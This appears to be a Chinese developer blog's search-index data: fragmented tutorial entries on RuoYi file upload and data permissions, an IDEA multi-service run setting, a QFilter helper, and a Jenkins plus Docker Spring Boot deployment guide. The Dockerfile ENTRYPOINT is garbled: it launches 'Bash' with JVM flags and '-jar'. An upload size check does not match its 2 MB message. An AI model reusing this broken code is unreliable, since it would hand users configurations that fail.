response.setCharacterEncoding(\"utf-8\"); response.setContentType(\"multipart/form-data\"); response.setHeader(\"Content-Disposition\", \"attachment;fileName=\" + FileUtils.setFileDownloadHeader(request, downloadName)); FileUtils.writeBytes(downloadPath, response.getOutputStream()); } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:2:2","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"使用ElementUI自带的action ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"Vue前端界面元素 \u003cel-upload ref=\"upload\" :limit=\"1\" accept=\".jpg, .png\" :action=\"upload.url\" :headers=\"upload.headers\" :file-list=\"upload.fileList\" :on-progress=\"handleFileUploadProgress\" :on-success=\"handleFileSuccess\" :auto-upload=\"true\"\u003e \u003cel-button slot=\"trigger\" size=\"small\" type=\"primary\"\u003e选取文件\u003c/el-button\u003e \u003cel-button style=\"margin-left: 10px;\" size=\"small\" type=\"success\" :loading=\"upload.isUploading\" @click=\"submitUpload\"\u003e上传到服务器\u003c/el-button\u003e \u003cdiv slot=\"tip\" class=\"el-upload__tip\"\u003e只能上传jpg/png文件，且不超过500kb\u003c/div\u003e \u003c/el-upload\u003e ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:1","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"引入获取token import { getToken } from \"@/utils/auth\"; ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:2","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"Data相关数据 // 上传参数 upload: { // 是否禁用上传 isUploading: false, // 设置上传的请求头部 headers: { Authorization: \"Bearer \" + getToken() }, // 上传的地址 url: process.env.VUE_APP_BASE_API + \"/common/upload\", // 上传的文件列表 fileList: [] }, ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:3","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"增加相关方法 handleAddFile() { this.upload.fileList = []; }, handleUpdateFile(row) { this.upload.fileList = [{ name: this.form.fileName, url: this.form.filePath }]; }, // 文件提交处理 submitUpload() { this.$refs.upload.submit(); }, // 文件上传中处理 handleFileUploadProgress(event, file, fileList) { this.upload.isUploading = true; }, // 文件上传成功处理 handleFileSuccess(response, file, fileList) { this.upload.isUploading = false; this.form.filePath = response.url; this.msgSuccess(response.msg); }, ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:4","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"后端远程调用文件服务 import com.ruoyi.common.core.constant.ServiceNameConstants; import com.ruoyi.common.core.domain.R; import com.ruoyi.pay.client.impl.RemoteFileFallbackFactory; import com.ruoyi.system.api.domain.SysFile; import com.ruoyi.system.api.factory.RemoteUserFallbackFactory; import com.ruoyi.system.api.model.LoginUser; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.http.MediaType; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.multipart.MultipartFile; @FeignClient(contextId = \"sysFileService\", value = ServiceNameConstants.FILE_SERVICE, fallbackFactory = RemoteFileFallbackFactory.class) public interface RemoteFileService { /** * 通过上传文件 * * @param file 文件 * @return 结果 */ @GetMapping(value = \"/upload\",consumes = MediaType.MULTIPART_FORM_DATA_VALUE) public R\u003cSysFile\u003e upload(MultipartFile file); } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:5","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"远程调用降级处理 import com.ruoyi.common.core.domain.R; import com.ruoyi.pay.client.RemoteFileService; import com.ruoyi.system.api.RemoteUserService; import com.ruoyi.system.api.domain.SysFile; import com.ruoyi.system.api.model.LoginUser; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.cloud.openfeign.FallbackFactory; import org.springframework.stereotype.Component; import org.springframework.web.multipart.MultipartFile; @Component public class RemoteFileFallbackFactory implements FallbackFactory\u003cRemoteFileService\u003e { private static final Logger log = LoggerFactory.getLogger(RemoteFileFallbackFactory.class); @Override public RemoteFileService create(Throwable throwable) { log.error(\"文件服务调用失败:{}\", throwable.getMessage()); return new RemoteFileService() { @Override public R\u003cSysFile\u003e upload(MultipartFile file) { return R.fail(\"上传文件失败:\" + throwable.getMessage()); } }; } } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:6","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"后端Controller /** * 文件上传请求 */ @RequiresPermissions(\"system:qrcodes:add_code\") @Log(title = \"【请填写功能名称】\", businessType = BusinessType.INSERT) @PostMapping(\"/qrcode/upload\") public R\u003cSysFile\u003e upload(MultipartFile file){ R\u003cSysFile\u003e upload = remoteFileService.upload(file); return upload; } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:7","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"后端debugger ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:8","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"前端请求 ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:9","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"使用自定义http-request ​ 不使用action定义文件上传接口，而是通过用户自定义方法实现对文件的上传，例如，更具不同的文件类型上传到不同的接口，相比较与以上方法灵活性更高。 ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"vue自定义http-request \u003cel-upload ref=\"upload_img\" :limit=\"1\" accept=\".jpg, .png\" :action=\"upload.url\" :headers=\"upload.headers\" :file-list=\"upload.fileList\" :on-progress=\"handleFileUploadProgress\" :on-success=\"handleFileSuccess\" :http-request=\"uploadSectionFile\" :auto-upload=\"true\"\u003e \u003cel-button slot=\"trigger\" size=\"small\" type=\"primary\"\u003e选取文件\u003c/el-button\u003e \u003cel-button style=\"margin-left: 10px;\" size=\"small\" type=\"success\" :loading=\"upload.isUploading\" @click=\"submitUpload\"\u003e上传到服务器\u003c/el-button\u003e \u003cdiv slot=\"tip\" class=\"el-upload__tip\"\u003e只能上传jpg/png文件，且不超过500kb\u003c/div\u003e \u003c/el-upload\u003e ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:1","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"自定义方法 uploadSectionFile(params){ // 自定义上传方法 console.log(params) var that = this var file = params.file //获取上传的文件 let formData = new FormData(); formData.append(\"file\",params.file) console.log(formData.get(\"file\")) var fileType = file.type //获取文件类型 var isImage = fileType.indexOf('image') != -1 // 判断是否是图片类型 var file_url = that.$refs.upload_img.uploadFiles[0].url; // console.log(file,fileType,isImage,file_url,that.$refs.upload_img); var isLt2M = file.size / 1024 / 1024 \u003c 10; if (!isLt2M) { // 判断大小 alert(\"上传图片的大小不能超过 2MB!\"); that.$refs.upload_img.uploadFiles = []; //不符合就清空已选择的图片 return; } if(!isImage){ // 文件格式 alert(\"请选择图片文件！\"); that.$refs.upload_img.uploadFiles = []; //不符合就清空已选择的图片 return; } that.uploadFile(file); }, uploadFile(file) { // 上传的函数 var that = this var formData = new FormData(); formData.append(\"file\", file); uploadQrcode(formData) .then(function (res) { console.log(res); if(res.code == 200){ //成功的话将数据插入data中 that.upload.fileList[0]=res.data; // that.file_list[0]=res.data.data.img; }else{ // 上传失败，清除已选择 内容 ，并提示失败原因 that.$refs.upload_img.uploadFiles = []; that.$alert('图片上传异常，原因：'+res.data.data, '', { showConfirmButton: false, callback: action =\u003e {} }); } }) } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:2","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"定义API接口 export function uploadQrcode(formData) { return request({ url: '/pay/qrcodes/qrcode/upload', method: 'post', headers: { 'Content-Type': 'multipart/form-data', //设置请求头请求格式form }, data: formData, }) } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:3","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"请求 ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:4","tags":["ruoyi","文件上传"],"title":"Ruoyi框架之文件上传","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["Java后端","ruoyi"],"content":"在实际开发中，需要设置用户只能查看哪些部门的数据，这种情况一般称为数据权限。 例如对于销售，财务的数据，它们是非常敏感的，因此要求对数据权限进行控制， 对于基于集团性的应用系统而言，就更多需要控制好各自公司的数据了。如设置只能看本公司、或者本部门的数据，对于特殊的领导，可能需要跨部门的数据， 因此程序不能硬编码那个领导该访问哪些数据，需要进行后台的权限和数据权限的控制。 提示 默认系统管理员admin拥有所有数据权限（userId=1），默认角色拥有所有数据权限（如不需要数据权限不用设置数据权限操作） ","date":"2022-10-03","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%9D%83%E9%99%90/:0:0","tags":["ruoyi"],"title":"Ruoyi框架之数据权限","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%9D%83%E9%99%90/"},{"categories":["Java后端","ruoyi"],"content":"注解参数说明 参数 类型 默认值 描述 deptAlias String 空 部门表的别名 userAlias String 空 用户表的别名 ","date":"2022-10-03","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%9D%83%E9%99%90/:0:1","tags":["ruoyi"],"title":"Ruoyi框架之数据权限","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%9D%83%E9%99%90/"},{"categories":["Java后端","ruoyi"],"content":"数据权限使用 1、在（系统管理-角色管理）设置需要数据权限的角色 目前支持以下几种权限 全部数据权限 自定数据权限 部门数据权限 部门及以下数据权限 仅本人数据权限 2、在需要数据权限控制方法上添加@DataScope注解，其中d和u用来表示表的别名 部门数据权限注解 @DataScope(deptAlias = \"d\") public List\u003c...\u003e select(...) { return mapper.select(...); } 部门及用户权限注解 @DataScope(deptAlias = \"d\", userAlias = \"u\") public List\u003c...\u003e select(...) { return mapper.select(...); } 3、在mybatis查询底部标签添加数据范围过滤 \u003cselect id=\"select\" parameterType=\"...\" resultMap=\"...Result\"\u003e \u003cinclude refid=\"select...Vo\"/\u003e \u003c!-- 数据范围过滤 --\u003e ${params.dataScope} \u003c/select\u003e 例如：用户管理（未过滤数据权限的情况）： --left join 只是把部门名称带过来，没有数据权限 select u.user_id, u.dept_id, u.login_name, u.user_name, u.email , u.phonenumber, u.password, u.sex, u.avatar, u.salt , u.status, u.del_flag, u.login_ip, u.login_date, u.create_by , u.create_time, u.remark, d.dept_name from sys_user u left join sys_dept d on u.dept_id = d.dept_id where u.del_flag = '0' 例如：用户管理（已过滤数据权限的情况）： select u.user_id, u.dept_id, u.login_name, u.user_name, u.email , u.phonenumber, u.password, u.sex, u.avatar, u.salt , u.status, u.del_flag, u.login_ip, u.login_date, u.create_by , u.create_time, u.remark, d.dept_name from sys_user u left join sys_dept d on u.dept_id = d.dept_id where u.del_flag = '0' and u.dept_id in ( select dept_id from sys_role_dept where role_id = 2 ) 结果很明显，我们多了如下语句。通过角色部门表（sys_role_dept）完成了数据权限过滤 and u.dept_id in ( select dept_id from sys_role_dept where role_id = 2 ) 逻辑实现代码 com.ruoyi.framework.aspectj.DataScopeAspect package com.ruoyi.common.datascope.aspect; import org.aspectj.lang.JoinPoint; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Before; import org.springframework.stereotype.Component; import com.ruoyi.common.core.utils.StringUtils; import com.ruoyi.common.core.web.domain.BaseEntity; import com.ruoyi.common.datascope.annotation.DataScope; import com.ruoyi.common.security.utils.SecurityUtils; import com.ruoyi.system.api.domain.SysRole; import com.ruoyi.system.api.domain.SysUser; import com.ruoyi.system.api.model.LoginUser; /** * 数据过滤处理 * * @a","date":"2022-10-03","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%9D%83%E9%99%90/:0:2","tags":["ruoyi"],"title":"Ruoyi框架之数据权限","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%9D%83%E9%99%90/"},{"categories":["Tools"],"content":"问题：idea微服务项目启动spring boot项目需要多次启动 如果微服务过多，启动的时候会点击多次，而且一旦某一个服务启动失败，无法看到启动失败的项目，在开发阶段增加开发人员的工作量；那么有没有一键启动所有项目的工具呢？ ","date":"2022-10-02","objectID":"/posts/idea%E6%89%B9%E9%87%8F%E8%BF%90%E8%A1%8C%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE/:0:1","tags":["idea"],"title":"Idea批量运行微服务项目","uri":"/posts/idea%E6%89%B9%E9%87%8F%E8%BF%90%E8%A1%8C%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE/"},{"categories":["Tools"],"content":"解决方案 IDEA本身就支持多项目一键启动，那么如何实现 1、在.idea文件夹下找到workspace.xml文件 2、在project标签添加配置 \u003ccomponent name=\"RunDashboard\"\u003e \u003coption name=\"configurationTypes\"\u003e \u003cset\u003e \u003coption value=\"SpringBootApplicationConfigurationType\" /\u003e \u003c/set\u003e \u003c/option\u003e \u003c/component\u003e 注意是在project标签内部： 3、批量启动项目 第一次启动可能会看不到这个界面，此时只需要随意启动一个spring boot服务，这个界面就出来了，下次启动项目就可以实现批量重启，并且可以看到启动失败的项目，快速定位问题 ","date":"2022-10-02","objectID":"/posts/idea%E6%89%B9%E9%87%8F%E8%BF%90%E8%A1%8C%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE/:0:2","tags":["idea"],"title":"Idea批量运行微服务项目","uri":"/posts/idea%E6%89%B9%E9%87%8F%E8%BF%90%E8%A1%8C%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE/"},{"categories":["Java后端"],"content":"前端传回后端的数据结构 text:无实际用途，为第一个搜索值，没有包含全部，所以搜索条件大多不用，除非搜索条件固定且单一 searchFields:搜索框中键入的搜索条件 fieldNames:前后端预设的搜索key,即前后端约定的搜索条件 source:搜索控件的元数据，与本博客无关 ","date":"2022-09-13","objectID":"/posts/%E5%BF%AB%E9%80%9F%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BD%ACqfilter/:1:0","tags":["QFilter"],"title":"快速过滤器转QFilter","uri":"/posts/%E5%BF%AB%E9%80%9F%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BD%ACqfilter/"},{"categories":["Java后端"],"content":"searchFields ​ 它本身是一个ArrayList，每一个元素是一个LinkedHashMap，LinkedHashMap中包含两个键值对，第一个键值对为搜索字段映射（字段之间为或关系），第二个键值对为搜索值映射（值之间为匹配或关系），多个LinkedHashMap之间为and关系。 ​ fieldNames:前后端约定的搜索字段， ","date":"2022-09-13","objectID":"/posts/%E5%BF%AB%E9%80%9F%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BD%ACqfilter/:2:0","tags":["QFilter"],"title":"快速过滤器转QFilter","uri":"/posts/%E5%BF%AB%E9%80%9F%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BD%ACqfilter/"},{"categories":["Java后端"],"content":"数据关系转Filter /** * @param fastFilter 快速过滤条件 * @param fastFilterRelationMap 关键词标识与单据字段映射关系 * @return */ protected List\u003cQFilter\u003e buildFastFilters(FastFilter fastFilter, Map\u003cString, String\u003e fastFilterRelationMap) { List\u003cQFilter\u003e qFilters = new ArrayList\u003c\u003e(); if (fastFilter == null) { return qFilters; } List\u003cMap\u003cString, List\u003cObject\u003e\u003e\u003e fastFilterMap = fastFilter.getFastFilter(); for (Map\u003cString, List\u003cObject\u003e\u003e searchKeyMap : fastFilterMap) { //关键词对应标识 List\u003cObject\u003e fieldNameList = searchKeyMap.get(\"FieldName\"); //关键词值 List\u003cObject\u003e valueList = searchKeyMap.get(\"Value\"); fieldNameList.stream().map(fieldName -\u003e { String filterKey = fastFilterRelationMap.get(fieldName); return valueList.stream().map(v -\u003e new QFilter(filterKey, QFilter.like, \"%\" + v + \"%\")) .reduce((a, b) -\u003e a.or(b)).orElse(null); }).filter(filter -\u003e Optional.ofNullable(filter).isPresent()) .reduce((a, b) -\u003e a.or(b)) .ifPresent(qFilters::add); } return qFilters; } ","date":"2022-09-13","objectID":"/posts/%E5%BF%AB%E9%80%9F%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BD%ACqfilter/:3:0","tags":["QFilter"],"title":"快速过滤器转QFilter","uri":"/posts/%E5%BF%AB%E9%80%9F%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BD%ACqfilter/"},{"categories":["运维"],"content":"本文章实现最简单全面的Jenkins+docker+springboot 一键自动部署项目，步骤齐全，少走坑路。 环境：centos7+git(gitee) 简述实现步骤：在docker安装jenkins，配置jenkins基本信息，利用Dockerfile和shell脚本实现项目自动拉取打包并运行。 ","date":"2022-09-12","objectID":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/:0:0","tags":[],"title":"Jenkins+Docker一键自动化部署SpringBoot项目","uri":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/"},{"categories":["运维"],"content":"一、安装docker docker安装社区版本CE 1.确保 yum 包更新到最新。 yum update 2.卸载旧版本(如果安装过旧版本的话) yum remove docker docker-common docker-selinux docker-engine 3.安装需要的软件包 yum install -y yum-utils device-mapper-persistent-data lvm2 4.设置yum源 yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 5.安装docker yum install docker-ce #由于repo中默认只开启stable仓库，故这里安装的是最新稳定版17.12.0 yum install \u003c自己的版本\u003e # 例如：sudo yum install docker-ce-17.12.0.ce 6.启动和开机启动 systemctl start docker systemctl enable docker 7.验证安装是否成功 docker version ","date":"2022-09-12","objectID":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/:1:0","tags":[],"title":"Jenkins+Docker一键自动化部署SpringBoot项目","uri":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/"},{"categories":["运维"],"content":"二、安装Jenkins Jenkins中文官网： https://www.jenkins.io/zh/ 1.安装Jenkins docker 安装一切都是那么简单，注意检查8080是否已经占用！如果占用修改端口 docker run --name jenkins -u root --rm -d -p 8080:8080 -p 50000:50000 -v /var/jenkins_home:/var/jenkins_home -v /var/run/docker.sock:/var/run/docker.sock jenkinsci/blueocean 如果没改端口号的话 安装完成后访问地址-\u003e http://{部署Jenkins所在服务IP}:8080 此处会有几分钟的等待时间。 2.初始化Jenkins 2.1 解锁Jenkins 进入Jenkins容器：docker exec -it {Jenkins容器名} bash 例如 docker exec -it jenkins bash 查看密码：cat /var/lib/jenkins/secrets/initialAdminPassword 复制密码到输入框里面 图片 2.2 安装插件 选择第一个：安装推荐的插件 图片 2.3 创建管理员用户 此账户一定要记住哦 ","date":"2022-09-12","objectID":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/:2:0","tags":[],"title":"Jenkins+Docker一键自动化部署SpringBoot项目","uri":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/"},{"categories":["运维"],"content":"三、系统配置 1. 安装需要插件 进入【首页】–【系统管理】–【插件管理】–【可选插件】 搜索以下需要安装的插件，点击安装即可。 图片 安装Maven Integration 安装Publish Over SSH(如果不需要远程推送，不用安装) 如果使用Gitee 码云，安装插件Gitee（Git自带不用安装） 2. 配置Maven 进入【首页】–【系统管理】–【全局配置】，拉到最下面maven–maven安装 图片 ","date":"2022-09-12","objectID":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/:3:0","tags":[],"title":"Jenkins+Docker一键自动化部署SpringBoot项目","uri":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/"},{"categories":["运维"],"content":"四、创建任务 1. 新建任务 点击【新建任务】，输入任务名称，点击构建一个自由风格的软件项目 图片 2. 源码管理 点击【源码管理】–【Git】，输入仓库地址，添加凭证，选择好凭证即可。 图片 图片 3.构建触发器 点击【构建触发器】–【构建】–【增加构建步骤】–【调用顶层Maven目标】–【填写配置】–【保存】 图片 此处命令只是install，看是否能生成jar包 clean install -Dmaven.test.skip=true 图片 4. 保存 点击【保存】按钮即可 ","date":"2022-09-12","objectID":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/:4:0","tags":[],"title":"Jenkins+Docker一键自动化部署SpringBoot项目","uri":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/"},{"categories":["运维"],"content":"五、测试 该功能测试是否能正常打包 1. 构建 点击构建按钮 图片 2.查看日志 点击正在构建的任务，或者点击任务名称，进入详情页面，查看控制台输出，看是否能成功打成jar包。 该处日志第一次可能下载依赖jar包失败，再次点击构建即可成功。 图片 图片 3. 查看项目位置 cd /var/jenkins_home/workspace ll 即可查看是否存在 ","date":"2022-09-12","objectID":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/:5:0","tags":[],"title":"Jenkins+Docker一键自动化部署SpringBoot项目","uri":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/"},{"categories":["运维"],"content":"六、运行项目 因为我们项目和jenkins在同一台服务器，所以我们用shell脚本运行项目，原理既是通过dockerfile 打包镜像，然后docker运行即可。 1. Dockerfile 在springboot项目根目录新建一个名为Dockerfile的文件，注意没有后缀名，其内容如下:（大致就是使用jdk8，把jar包添加到docker然后运行prd配置文件。详细可以查看其他教程） FROM jdk:8 VOLUME /tmp ADD target/zx-order-0.0.1-SNAPSHOT.jar app.jar EXPOSE 8888 ENTRYPOINT [\"Bash\",\"-DBash.security.egd=file:/dev/./urandom\",\"-jar\",\"/app.jar\",\"--spring.profiles.active=prd\"] 2. 修改jenkins任务配置 图片 配置如下： 图片 -t：指定新镜像名 .：表示Dockfile在当前路径 cd /var/jenkins_home/workspace/zx-order-api docker stop zx-order || true docker rm zx-order || true docker rmi zx-order || true docker build -t zx-order . docker run -d -p 8888:8888 --name zx-order zx-order:latest 备注： 我上图用了docker logs -f 是为了方便看日志，真实不要用，因为会一直等待日志，构建任务会失败 加|| true 是如果命令执行失败也会继续实行，为了防止第一次没有该镜像报错 3. 保存 点击保存即可 4. 构建 查看jenkins控制台输出，输出如下，证明成功！ 图片 5. 验证 docker ps 查看是否有自己的容器 docker logs 自己的容器名 查看日志是否正确 浏览器访问项目试一试 ","date":"2022-09-12","objectID":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/:6:0","tags":[],"title":"Jenkins+Docker一键自动化部署SpringBoot项目","uri":"/posts/jenkins-docker%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2springboot%E9%A1%B9%E7%9B%AE/"},{"categories":["Java后端"],"content":"1、简介 注解是一种能被添加到java源代码中的元数据，方法、类、参数和包都可以用注解来修饰。注解可以看作是一种特殊的标记，可以用在方法、类、参数和包上，程序在编译或者运行时可以检测到这些标记而进行一些特殊的处理。 ","date":"2022-09-11","objectID":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/:1:0","tags":["自定义注解"],"title":"自定义注解","uri":"/posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3/"},{"categories":["Java后端"],"content":"2、元注解 